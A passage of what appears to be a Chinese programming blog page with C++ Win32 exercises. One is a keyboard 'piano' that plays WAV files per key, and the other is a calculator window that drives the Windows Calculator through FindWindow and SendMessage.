class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;Data.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> Data::Souce[<span class="number">50</span>] = &#123;&#125;;</span><br><span class="line"><span class="comment">//从本地读取歌谱</span></span><br><span class="line"><span class="function">BOOL <span class="title">Data::ReadData</span><span class="params">(HWND hwnd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">FILE* file;</span><br><span class="line"><span class="comment">//如果打开成则为0</span></span><br><span class="line"><span class="keyword">int</span> Errno = fopen_s(&amp;file, <span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound.txt&quot;</span>, <span class="string">&quot;r+&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (Errno != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">MessageBox(hwnd, <span class="string">L&quot;错误&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">fgets(Souce,<span class="number">50</span>,file);</span><br><span class="line"><span class="comment">//关闭文件</span></span><br><span class="line">fclose(file);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//判断字符对应所播放的音乐</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Data::If_Case</span><span class="params">(<span class="keyword">char</span> c_char)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (c_char)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;Q&#x27;</span>:</span><br><span class="line">PlaySoundA(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_Q.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line">Sleep(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;W&#x27;</span>:</span><br><span class="line">PlaySoundA(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_W.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line">Sleep(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line">PlaySoundA(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_E.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line">Sleep(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;R&#x27;</span>:</span><br><span class="line">PlaySoundA(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_R.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line">Sleep(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;T&#x27;</span>:</span><br><span class="line">PlaySoundA(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_T.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line">Sleep(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;Y&#x27;</span>:</span><br><span class="line">PlaySoundA(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_Y.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line">Sleep(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;U&#x27;</span>:</span><br><span class="line">PlaySoundA(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_U.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line">Sleep(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;I&#x27;</span>:</span><br><span class="line">PlaySoundA(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_I.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line">Sleep(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;O&#x27;</span>:</span><br><span class="line">PlaySoundA(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_O.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line">Sleep(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;P&#x27;</span>:</span><br><span class="line">PlaySoundA(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_P.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line">Sleep(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;A&#x27;</span>:</span><br><span class="line">PlaySoundA(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_A.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line">Sleep(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line">PlaySoundA(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_S.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line">Sleep(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;D&#x27;</span>:</span><br><span class="line">PlaySoundA(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_D.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line">Sleep(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;F&#x27;</span>:</span><br><span class="line">PlaySoundA(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_F.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line">Sleep(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;G&#x27;</span>:</span><br><span class="line">PlaySoundA(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_G.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line">Sleep(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;H&#x27;</span>:</span><br><span class="line">PlaySoundA(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_H.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line">Sleep(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;J&#x27;</span>:</span><br><span class="line">PlaySoundA(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_J.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line">Sleep(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;K&#x27;</span>:</span><br><span class="line">PlaySoundA(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_K.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line">Sleep(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;L&#x27;</span>:</span><br><span class="line">PlaySoundA(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_L.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line">Sleep(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line">PlaySoundA(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_Z.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line">Sleep(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;X&#x27;</span>:</span><br><span class="line">PlaySoundA(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_X.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line">Sleep(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span>:</span><br><span class="line">PlaySoundA(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_C.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line">Sleep(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;V&#x27;</span>:</span><br><span class="line">PlaySoundA(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_V.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line">Sleep(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;B&#x27;</span>:</span><br><span class="line">PlaySoundA(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_B.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line">Sleep(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;N&#x27;</span>:</span><br><span class="line">PlaySoundA(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_N.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line">Sleep(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>:</span><br><span class="line">PlaySoundA(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_M.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line">Sleep(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27; &#x27;</span>:</span><br><span class="line">Sleep(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="题：计算器"><a href="#题：计算器" class="headerlink" title="题：计算器"></a>题：计算器</h2><p>描述：自己编写一个计算器能够控制windows系统中的计算器进行操作</p><h3 id="main-cpp-主函数-1"><a href="#main-cpp-主函数-1" class="headerlink" title="main.cpp//主函数"></a>main.cpp//主函数</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WndProc</span><span class="params">(HWND hwnd, UINT msg, WPARAM wparam, LPARAM lparam)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">WinMain</span><span class="params">(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,<span class="keyword">int</span> nCmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">WNDCLASS wc = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">wc.lpszClassName = <span class="string">L&quot;my_calc&quot;</span>;</span><br><span class="line">wc.lpfnWndProc = WndProc;</span><br><span class="line">wc.hbrBackground =(HBRUSH)COLOR_APPWORKSPACE;</span><br><span class="line"></span><br><span class="line">RegisterClass(&amp;wc);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建窗口</span></span><br><span class="line">HWND hwnd=CreateWindow(<span class="string">L&quot;my_calc&quot;</span>,<span class="string">L&quot;计算器&quot;</span>,WS_OVERLAPPEDWINDOW,CW_USEDEFAULT,<span class="number">0</span>,<span class="number">390</span>,<span class="number">600</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,hInstance,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">ShowWindow(hwnd, SW_NORMAL);</span><br><span class="line">UpdateWindow(hwnd);</span><br><span class="line"></span><br><span class="line"><span class="comment">//消息循环</span></span><br><span class="line">MSG msg = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">while</span> (GetMessage(&amp;msg,<span class="literal">NULL</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">TranslateMessage(&amp;msg);</span><br><span class="line"></span><br><span class="line">DispatchMessage(&amp;msg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//回调函数消息处理</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WndProc</span><span class="params">(HWND hwnd, UINT msg, WPARAM wparam, LPARAM lparam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HWND calc = FindWindow(<span class="string">L&quot;CalcFrame&quot;</span>, <span class="string">L&quot;计算器&quot;</span>);</span><br><span class="line"><span class="keyword">static</span> HINSTANCE hInstance = (HINSTANCE)GetModuleHandle(<span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//HWND calc=FindWindow(NULL,L&quot;计算器&quot; );</span></span><br><span class="line"><span class="comment">//HWND calc = (HWND)0x00140596;</span></span><br><span class="line"><span class="keyword">switch</span> (msg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> WM_CREATE:</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//SendMessage(calc, WM_COMMAND, MAKEWPARAM(0x83, BN_CLICKED), NULL);</span></span><br><span class="line"><span class="comment">//对话框</span></span><br><span class="line">CreateWindow(<span class="string">L&quot;edit&quot;</span>, <span class="string">L&quot; &quot;</span>, WS_CHILD | WS_VISIBLE | WS_BORDER, <span class="number">10</span>, <span class="number">10</span>, <span class="number">350</span>, <span class="number">180</span>, hwnd, (HMENU)<span class="number">0x1011</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//按键</span></span><br><span class="line">CreateWindow(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;清空&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">10</span>, <span class="number">200</span>, <span class="number">170</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x1000</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line">CreateWindow(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;退格&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">190</span>, <span class="number">200</span>, <span class="number">170</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x1017</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">CreateWindow(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;1&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">10</span>, <span class="number">260</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x1001</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line">CreateWindow(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;2&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">10</span>, <span class="number">320</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x1002</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line">CreateWindow(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;3&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">10</span>, <span class="number">380</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x1003</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line">CreateWindow(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;4&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">100</span>, <span class="number">260</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x1004</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line">CreateWindow(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;5&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">100</span>, <span class="number">320</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x1005</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line">CreateWindow(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;6&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">100</span>, <span class="number">380</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x1006</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line">CreateWindow(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;7&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">190</span>, <span class="number">260</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x1007</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line">CreateWindow(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;8&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">190</span>, <span class="number">320</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x1008</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line">CreateWindow(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;9&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">190</span>, <span class="number">380</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x1009</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line">CreateWindow(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;0&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">10</span>, <span class="number">440</span>, <span class="number">170</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x0011</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line">CreateWindow(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;.&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">190</span>, <span class="number">440</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x10012</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">CreateWindow(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;+&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">280</span>, <span class="number">260</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x10013</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line">CreateWindow(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;-&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">280</span>, <span class="number">320</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x10014</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line">CreateWindow(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;*&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">280</span>, <span class="number">380</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x10015</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line">CreateWindow(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;/&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">280</span>, <span class="number">440</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x10016</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line">CreateWindow(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;等于&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">10</span>, <span class="number">500</span>, <span class="number">350</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x10018</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> WM_CLOSE:</span><br><span class="line">&#123;</span><br><span class="line">DestroyWindow(hwnd);</span><br><span class="line"></span><br><span class="line">PostQuitMessage(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> WM_COMMAND:</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">switch</span> (LOWORD(wparam))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1011</span>:<span class="comment">//对话框</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1000</span>:<span class="comment">//清空                         //0x51是控件ID</span></span><br><span class="line">SendMessage(calc, WM_COMMAND, MAKEWPARAM(<span class="number">0x51</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1017</span>:<span class="comment">//清空</span></span><br><span class="line">SendMessage(calc, WM_COMMAND, MAKEWPARAM(<span class="number">0x53</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1001</span>:<span class="comment">//数字1</span></span><br><span class="line">SendMessage(calc, WM_COMMAND, MAKEWPARAM(<span class="number">0x83</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1002</span>:<span class="comment">//数字2</span></span><br><span class="line">SendMessage(calc, WM_COMMAND, MAKEWPARAM(<span class="number">0x84</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1003</span>:<span class="comment">//数字3</span></span><br><span class="line">SendMessage(calc, WM_COMMAND, MAKEWPARAM(<span class="number">0x85</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1004</span>:<span class="comment">//数字4</span></span><br><span class="line">SendMessage(calc, WM_COMMAND, 